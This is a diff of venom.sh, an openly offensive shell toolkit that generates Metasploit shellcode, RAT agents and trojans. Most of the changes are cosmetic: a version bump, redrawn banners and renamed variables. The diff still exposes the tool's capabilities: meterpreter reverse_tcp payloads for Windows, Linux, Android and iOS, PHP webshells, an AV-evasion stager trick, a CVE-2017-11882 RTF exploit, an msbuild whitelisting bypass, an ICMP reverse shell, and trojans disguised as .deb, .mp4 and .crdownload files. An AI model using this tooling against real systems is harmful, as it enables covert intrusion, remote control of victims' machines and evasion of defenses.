@@ -1,9 +1,9 @@
 #!/bin/sh
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - @2019
-# codename: aconitum_nappelus [ GPL licensed ]
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: v1.0.17
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - @2020
+# codename: Shinigami [ GPL licensed ]
 # --------------------------------------------------------------
 # [DEPENDENCIES]
 # "venom.sh will download/install all dependencies as they are needed"
@@ -63,8 +63,8 @@ Colors;
 # ----------------------
 OS=`uname` # grab OS
 H0m3=`echo ~` # grab home path
-ver="1.0.16" # script version display
-C0d3="aconitum_nappelus" # version codename display
+ver="1.0.17" # script version display
+C0d3="Shinigami" # version codename display
 user=`who | awk {'print $1'}` # grab username
 # user=`who | cut -d' ' -f1 | sort | uniq` # grab username
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
@@ -113,16 +113,17 @@ EnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1
 # Config user system correct arch (wine+mingw)
 # --------------------------------------------
 if [ "$ArCh" = "x86" ]; then
-  arch="wine"
-  ComP="i586-mingw32msvc-gcc"
+   arch="wine"
+   PgFi="Program Files"
+   ComP="i586-mingw32msvc-gcc"
 elif [ "$ArCh" = "x64" ]; then
-  arch="wine64"
-  ComP="i686-w64-mingw32-gcc"
+   arch="wine64"
+   PgFi="Program Files"
+   ComP="i686-w64-mingw32-gcc"
 else
-  echo ${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}
-  echo ${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}
-  sleep 3
-  exit
+   echo "${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}"
+   echo "${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}"
+   exit
 fi
 
 
@@ -217,14 +218,14 @@ echo ${BlueF} && clear && cat << !
                \  \// |   ___||     \| ||     ||     \/   |
                 \__/  |______||__/\____|\_____/|__/\__/|__|
 !
-echo "${RedF}    Shellcode_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam)2019${BlueF}"
-echo "    ╔────────────────────────────────────────────────────────────────╗"
-echo "    |  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   |"
-echo "    |  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} |"
-echo "    |  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  |"
-echo "    |  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      |"
-echo "    ╠────────────────────────────────────────────────────────────────╝"
-echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
+echo "${RedF}     Shellcode/Rat_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam @2020)${BlueF}"
+echo "    ╔════════════════════════════════════════════════════════════════╗"
+echo "    ║  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   ║"
+echo "    ║  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} ║"
+echo "    ║  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  ║"
+echo "    ║  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      ║"
+echo "    ╠════════════════════════════════════════════════════════════════╝"
+echo "    | Author: r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
 echo "    ╘ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
 echo "" && echo ""
 sleep 1
@@ -286,14 +287,14 @@ if [ "$Chts" = "ON" ]; then
   else
 echo ${BlueF}
 cat << !
-    ╔─────────────────────────────────────────────────────────────────────╗
-    |  arno0x0x meterpreter_loader random bytes stager av bypass technic  |
-    |                              ---                                    |
-    | This setting forces venom toolkit at startup to backup/replace the  |
-    | msf meterpreter_loader.rb (x86) and is counter part (x64) adding an |
-    | arbitrary number of random bytes at the beginning of the stage being|
-    |sent back to the stager in an attempt to evade AV signature detection|
-    ╚─────────────────────────────────────────────────────────────────────╝
+    ╔═════════════════════════════════════════════════════════════════════╗
+    ║  arno0x0x meterpreter_loader random bytes stager av bypass technic  ║
+    ║                              ---                                    ║
+    ║ This setting forces venom toolkit at startup to backup/replace the  ║
+    ║ msf meterpreter_loader.rb (x86) and is counter part (x64) adding an ║
+    ║ arbitrary number of random bytes at the beginning of the stage being║
+    ║sent back to the stager in an attempt to evade AV signature detection║
+    ╚═════════════════════════════════════════════════════════════════════╝
 
 !
 sleep 2
@@ -469,12 +470,12 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | NAME    : $N4m
-    | FORMAT  : C -> UNIX
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    NAME    : $N4m
+    FORMAT  : C -> UNIX
+    PAYLOAD : $paylo
 
 !
 
@@ -500,7 +501,7 @@ cmd=$(cat $IPATH/output/chars.raw | grep -v "=")
    fi
 
    # check if gcc exists
-   c0m=`which gcc`> /dev/null 2>&1
+   audit=`which gcc`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
       echo "${BlueF}[☠]${white} gcc compiler -> found!"${Reset};
       sleep 2
@@ -529,7 +530,7 @@ echo "#include<unistd.h>" >> $IPATH/output/exec.c
 echo "" >> $IPATH/output/exec.c
 echo "/*" >> $IPATH/output/exec.c
 echo "Author: r00t-3xp10it" >> $IPATH/output/exec.c
-echo "Framework: venom v1.0.16" >> $IPATH/output/exec.c
+echo "Framework: venom v1.0.17" >> $IPATH/output/exec.c
 echo "gcc -fno-stack-protector -z execstack exec.c -o $N4m" >> $IPATH/output/exec.c
 echo "*/" >> $IPATH/output/exec.c
 echo "" >> $IPATH/output/exec.c
@@ -789,11 +790,11 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -833,7 +834,7 @@ sleep 2
       fi
 
    # check if mingw32 exists
-   c0m=`which $ComP`> /dev/null 2>&1
+   audit=`which $ComP`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
       echo "[☠] mingw32 compiler -> found!"
       sleep 2
@@ -1160,11 +1161,11 @@ echo "[☠] Building shellcode -> dll format ..."
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : DLL -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : DLL -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -1416,11 +1417,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -1766,11 +1767,11 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -1810,7 +1811,7 @@ sleep 2
       fi
 
    # check if mingw32 exists
-   c0m=`which $ComP`> /dev/null 2>&1
+   audit=`which $ComP`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
       echo "[☠] mingw32 compiler -> found!"
       sleep 2
@@ -2149,11 +2150,11 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH-CMD -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH-CMD -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -2197,7 +2198,7 @@ echo "" && echo ""
       fi
 
    # check if mingw32 exists
-   c0m=`which $ComP`> /dev/null 2>&1
+   audit=`which $ComP`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
       echo "[☠] mingw32 compiler -> found!"
       sleep 2
@@ -2505,11 +2506,11 @@ echo "" > $IPATH/output/chars.raw
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -2724,11 +2725,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : MSI -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : MSI -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -3003,11 +3004,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -3333,11 +3334,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : HTA-PSH -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : HTA-PSH -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -3645,11 +3646,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH-CMD -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH-CMD -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -3964,11 +3965,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH-CMD -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH-CMD -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -4305,11 +4306,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : VBS -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : VBS -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -4583,11 +4584,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH-CMD -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH-CMD -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -4965,12 +4966,12 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | TROJAN  : $N4m.pdf
-    | FORMAT  : PSH-CMD -> WINDOWS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    TROJAN  : $N4m.pdf
+    FORMAT  : PSH-CMD -> WINDOWS
+    PAYLOAD : $paylo
 
 !
 
@@ -5554,11 +5555,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PHP - WEBSHELL
-    |_PAYLOAD : php/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PHP - WEBSHELL
+    PAYLOAD : php/meterpreter/reverse_tcp
 
 !
 
@@ -5725,11 +5726,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PHP -> WEBSHELL
-    |_PAYLOAD : php/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PHP -> WEBSHELL
+    PAYLOAD : php/meterpreter/reverse_tcp
 
 !
 
@@ -5934,12 +5935,12 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | RHOST   : $RRh0St
-    | FORMAT  : PHP -> APACHE2 (linux)
-    |_PAYLOAD : php/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    RHOST   : $RRh0St
+    FORMAT  : PHP -> APACHE2 (linux)
+    PAYLOAD : php/meterpreter/reverse_tcp
 
 !
 
@@ -6132,11 +6133,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PYTHON -> MULTI OS
-    |_PAYLOAD : python/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PYTHON -> MULTI OS
+    PAYLOAD : python/meterpreter/reverse_tcp
 
 !
 
@@ -6435,11 +6436,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : JAVA -> MULTI OS
-    |_PAYLOAD : java/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : JAVA -> MULTI OS
+    PAYLOAD : java/meterpreter/reverse_tcp
 
 !
 
@@ -6655,11 +6656,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH-CMD -> WINDOWS
-    |_PAYLOAD : windows/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH-CMD -> WINDOWS
+    PAYLOAD : windows/meterpreter/reverse_tcp
 
 !
 
@@ -6851,13 +6852,13 @@ if [ -z "$PuLK" ]; then PuLK="python";fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | URIPATH : /SecPatch
-    | SRVHOST : $srvhost
-    | FORMAT  : PYTHON -> MULTI OS
-    | PAYLOAD : python/meterpreter/reverse_tcp
-    |_STORED  : $IPATH/output/$filename.py
+    ──────────────
+    LPORT   : $lport
+    URIPATH : /SecPatch
+    SRVHOST : $srvhost
+    FORMAT  : PYTHON -> MULTI OS
+    PAYLOAD : python/meterpreter/reverse_tcp
+    STORED  : $IPATH/output/$filename.py
 
 !
 
@@ -7065,13 +7066,13 @@ filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload"
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | URIPATH : /SecPatch
-    | SRVHOST : $srvhost
-    | FORMAT  : PSH -> WINDOWS
-    | PAYLOAD : windows/meterpreter/reverse_tcp
-    |_STORED  : $IPATH/output/$filename.bat
+    ──────────────
+    LPORT   : $lport
+    URIPATH : /SecPatch
+    SRVHOST : $srvhost
+    FORMAT  : PSH -> WINDOWS
+    PAYLOAD : windows/meterpreter/reverse_tcp
+    STORED  : $IPATH/output/$filename.bat
 
 !
 
@@ -7264,12 +7265,12 @@ if [ -z "$N4m" ]; then N4m="Chaitanya";fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | SRVPORT : 8080
-    | SRVHOST : $srvhost
-    | FORMAT  : SH,PYTHON -> UNIX(s)
-    | PAYLOAD : python/meterpreter/reverse_tcp
-    |_AGENT   : $IPATH/output/$N4m.deb
+    ──────────────
+    SRVPORT : 8080
+    SRVHOST : $srvhost
+    FORMAT  : SH,PYTHON -> UNIX(s)
+    PAYLOAD : python/meterpreter/reverse_tcp
+    AGENT   : $IPATH/output/$N4m.deb
 
 !
 
@@ -7420,11 +7421,11 @@ echo "[☠] Building shellcode -> DALVIK format ..."
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : DALVIK -> ANDROID
-    |_PAYLOAD : android/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : DALVIK -> ANDROID
+    PAYLOAD : android/meterpreter/reverse_tcp
 
 !
 
@@ -7625,11 +7626,11 @@ echo "[☠] Building shellcode -> MACHO format .."
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : MACHO -> IOS
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : MACHO -> IOS
+    PAYLOAD : $paylo
 
 !
 
@@ -7792,11 +7793,11 @@ echo "[☠] Building shellcode -> Android ARM format ..."
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : Android ARM -> ANDROID
-    |_PAYLOAD : android/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : Android ARM -> ANDROID
+    PAYLOAD : android/meterpreter/reverse_tcp
 
 !
 
@@ -7967,11 +7968,11 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : ELF -> LINUX
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : ELF -> LINUX
+    PAYLOAD : $paylo
 
 !
 sleep 1
@@ -8197,11 +8198,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> LINUX
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> LINUX
+    PAYLOAD : $paylo
 
 !
 sleep 1
@@ -8233,7 +8234,7 @@ echo "#include<unistd.h>" >> htop.c
 echo "" >> htop.c
 echo "/*" >> htop.c
 echo "Author: r00t-3xp10it" >> htop.c
-echo "Framework: venom v1.0.16" >> htop.c
+echo "Framework: venom v1.0.17" >> htop.c
 echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> htop.c
 echo "gcc -fno-stack-protector -z execstack htop.c -o htop_installer.deb" >> htop.c
 echo "'Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)'" >> htop.c
@@ -8507,13 +8508,13 @@ echo "[☠] Building agent -> C format .." && sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> LINUX
-    | PAYLOAD : $paylo
-    | MP4VIDEO: $IPATH/output/streaming.mp4
-    |_TROJAN  : $IPATH/output/$mP4.mp4
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> LINUX
+    PAYLOAD : $paylo
+    MP4VIDEO: $IPATH/output/streaming.mp4
+    TROJAN  : $IPATH/output/$mP4.mp4
 
 !
 sleep 1
@@ -8554,7 +8555,7 @@ echo "#include<unistd.h>" >> $mP4.c
 echo "" >> $mP4.c
 echo "/*" >> $mP4.c
 echo "Author: r00t-3xp10it" >> $mP4.c
-echo "Framework: venom v1.0.16" >> $mP4.c
+echo "Framework: venom v1.0.17" >> $mP4.c
 echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> $mP4.c
 echo "gcc -fno-stack-protector -z execstack $mP4.c -o $mP4.mp4" >> $mP4.c
 echo "*/" >> $mP4.c
@@ -8728,11 +8729,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
+    PAYLOAD : $paylo
 
 !
 
@@ -8956,11 +8957,11 @@ sleep 1
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
+    PAYLOAD : $paylo
 
 !
 
@@ -9344,11 +9345,11 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : C -> WINDOWS(EXE)
-    |_PAYLOAD : $paylo
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : C -> WINDOWS(EXE)
+    PAYLOAD : $paylo
 
 !
 #
@@ -9653,11 +9654,11 @@ if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one binary
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $LpOrt
-    | LHOST   : $LhOst
-    | PAYLOAD : $paylo
-    |_AGENT   : $IPATH/output/$N4m
+    ──────────────
+    LPORT   : $LpOrt
+    LHOST   : $LhOst
+    PAYLOAD : $paylo
+    AGENT   : $IPATH/output/$N4m
 
 !
 
@@ -9888,11 +9889,11 @@ cat << !
 
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PYTHON -> MULTI OS
-    |_PAYLOAD : python/meterpreter/reverse_tcp
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PYTHON -> MULTI OS
+    PAYLOAD : python/meterpreter/reverse_tcp
 
 
 !
@@ -10243,12 +10244,12 @@ if [ -z "$Targ" ]; then Targ="WINDOWS";fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : $orm -> $Targ
-    | PAYLOAD : $paa
-    |_AGENT   : $IPATH/output/$N4m.docm
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : $orm -> $Targ
+    PAYLOAD : $paa
+    AGENT   : $IPATH/output/$N4m.docm
 
 !
 
@@ -10263,7 +10264,7 @@ cat << !
    fi
 
    # check if mingw32 exists
-   c0m=`which $ComP`> /dev/null 2>&1
+   audit=`which $ComP`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
       echo "[☠] mingw32 compiler -> found!"
       sleep 2
@@ -10516,12 +10517,12 @@ if [ -z "$N4m" ]; then N4m="ms14_064";fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PYTHON -> WINDOWS
-    | PAYLOAD : python/meterpreter/reverse_tcp
-    |_AGENT   : $IPATH/output/$N4m.ppsx
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PYTHON -> WINDOWS
+    PAYLOAD : python/meterpreter/reverse_tcp
+    AGENT   : $IPATH/output/$N4m.ppsx
 
 !
 
@@ -10748,12 +10749,12 @@ if [ -z "$N4m" ]; then N4m="office";fi
 cat << !
 
     exploit settings
-    ╔─────────────────────
-    | LHOST   : $lhost
-    | CVE     : CVE-2017-11882
-    | FORMAT  : ANCII/HEX -> MICROSOFT OFFICE (RTF)
-    | PAYLOAD : $paylo
-    |_AGENT   : $IPATH/output/$N4m.rtf
+    ────────────────
+    LHOST   : $lhost
+    CVE     : CVE-2017-11882
+    FORMAT  : ANCII/HEX -> MICROSOFT OFFICE (RTF)
+    PAYLOAD : $paylo
+    AGENT   : $IPATH/output/$N4m.rtf
 
 !
 sleep 1
@@ -10848,13 +10849,13 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : CSHARP -> WINDOWS(XML)
-    | PAYLOAD : $paylo
-    | VULN    : msbuild - Application_whitelisting_bypass
-    |_DISCLOSURE : @subTee
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : CSHARP -> WINDOWS(XML)
+    PAYLOAD : $paylo
+    VULN    : msbuild - Application_whitelisting_bypass
+    DISCLOSURE : @subTee
 
 !
 
@@ -11031,12 +11032,12 @@ sleep 2
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : PSH-CMD -> WINDOWS(bat)
-    | PAYLOAD : $paylo
-    |_AGENT   : $IPATH/output/$N4m.bat
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : PSH-CMD -> WINDOWS(bat)
+    PAYLOAD : $paylo
+    AGENT   : $IPATH/output/$N4m.bat
 
 !
 
@@ -11111,12 +11112,12 @@ UpL=$(zenity --title "☠ INPUT FULL PATH OF PAYLOAD.EXE ☠" --filename=$IPATH 
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LPORT   : $lport
-    | LHOST   : $lhost
-    | FORMAT  : EXE -> WINDOWS(exe)
-    | PAYLOAD : $paylo
-    |_BINARY  : $UpL
+    ──────────────
+    LPORT   : $lport
+    LHOST   : $lhost
+    FORMAT  : EXE -> WINDOWS(exe)
+    PAYLOAD : $paylo
+    BINARY  : $UpL
 
 !
 
@@ -11442,12 +11443,12 @@ fi
 cat << !
 
     venom settings
-    ╔─────────────────────
-    | LHOST  : $lhost
-    | TARGET : $target
-    | UPLOAD : $rpath\\$slave.exe
-    | FORMAT : ICMP (ping) Reverse Shell
-    |_DISCLOSURE: @Daniel Compton
+    ──────────────
+    LHOST  : $lhost
+    TARGET : $target
+    UPLOAD : $rpath\\$slave.exe
+    FORMAT : ICMP (ping) Reverse Shell
+    DISCLOSURE: @Daniel Compton
 
 !
 sleep 2
@@ -11943,47 +11944,55 @@ cat << !
 
 
     AGENT Nº1
-    ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : Reverse TCP Powershell Shell
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | LOLBin             : WinHttpRequest (Fileless)
-    | DROPPER EXTENSION  : PS1|VBS
-    | AGENT EXTENSION    : PS1
-    |_AGENT PERSISTENCE  : NOT AVAILABLE
+    ─────────
+    DESCRIPTION        : Reverse TCP Powershell Shell
+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    LOLBin             : WinHttpRequest (Fileless)
+    DROPPER EXTENSION  : PS1|VBS
+    AGENT EXTENSION    : PS1
+    AGENT PERSISTENCE  : NOT AVAILABLE
 
     AGENT Nº2
-    ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : Reverse OpenSSL Powershell Shell
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | LOLBin             : Powershell (DownloadFile)
-    | DROPPER EXTENSION  : BAT
-    | AGENT EXTENSION    : PS1
-    |_AGENT PERSISTENCE  : AVAILABLE
+    ─────────
+    DESCRIPTION        : Reverse OpenSSL Powershell Shell
+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    LOLBin             : Powershell (DownloadFile)
+    DROPPER EXTENSION  : BAT
+    AGENT EXTENSION    : PS1
+    AGENT PERSISTENCE  : AVAILABLE
 
     AGENT Nº3
-    ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : Reverse Powershell Shell (hex ip obfuscation)
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | LOLBin             : Powershell (DownloadFile)
-    | DROPPER EXTENSION  : .{random}.BAT (MITRE T1036)
-    | AGENT EXTENSION    : PS1
-    |_AGENT PERSISTENCE  : AVAILABLE
+    ─────────
+    DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    LOLBin             : Powershell (DownloadFile)
+    DROPPER EXTENSION  : .crdownload.BAT (MITRE T1036)
+    AGENT EXTENSION    : PS1
+    AGENT PERSISTENCE  : AVAILABLE
 
     AGENT Nº4
-    ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : meterpeter Reverse PS Shell (ancii|bxor)
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | LOLBin             : Powershell (DownloadFile)
-    | DROPPER EXTENSION  : BAT
-    | AGENT EXTENSION    : PS1
-    |_AGENT PERSISTENCE  : AVAILABLE (meterpeter)
+    ─────────
+    DESCRIPTION        : meterpeter Reverse PS Shell (ascii|bxor)
